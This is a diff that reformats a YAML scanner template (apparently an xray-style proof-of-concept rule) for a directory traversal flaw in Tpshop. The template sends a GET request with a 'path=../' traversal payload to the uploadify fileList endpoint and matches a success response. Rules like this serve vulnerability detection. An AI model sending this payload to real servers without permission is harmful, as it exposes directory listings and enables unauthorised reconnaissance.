@@ -1,16 +1,18 @@
 id: tpshop-directory-traversal
 
 info:
-    name: Tpshop Directory Traversal
-    author: 清风明月(www.secbook.info)
-    severity: high
+  name: Tpshop Directory Traversal
+  author: 清风明月
+  severity: high
+  tags: tpshop,directory-traversal
+  created: 2025/03/13
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /index.php/Home/uploadify/fileList?type=.+&path=../
-            headers:
-                Accept-Encoding: deflate
-        expression: response.status == 200 && response.body.bcontains(bytes(string("\"state\":\"SUCCESS\""))) && response.body.bcontains(bytes(string("total")))
+  r0:
+    request:
+      method: GET
+      path: /index.php/Home/uploadify/fileList?type=.+&path=../
+      headers:
+        Accept-Encoding: deflate
+    expression: response.status == 200 && response.body.bcontains(bytes(string("\"state\":\"SUCCESS\""))) && response.body.bcontains(bytes(string("total")))
 expression: r0()
